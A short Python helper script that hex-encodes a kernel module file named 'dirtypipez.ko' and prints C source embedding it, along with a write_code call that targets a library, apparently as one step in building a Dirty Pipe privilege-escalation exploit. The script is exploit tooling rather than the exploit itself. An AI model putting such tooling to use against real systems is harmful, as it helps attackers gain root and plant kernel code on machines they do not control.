import re

with open('dirtypipez.ko', 'rb') as f:
    kmod = f.read()

l = len(kmod)
kmod = '\\x' + ('\\x'.join(re.findall('..', kmod.hex())))
print(
    f'const char * K_MODULE = "{kmod}"\n'
    f'const char ** o = &K_MODULE;\n'
    f'write_code(LIBTRACING, 1, {l}, ((char *) (o + 1)));'
)

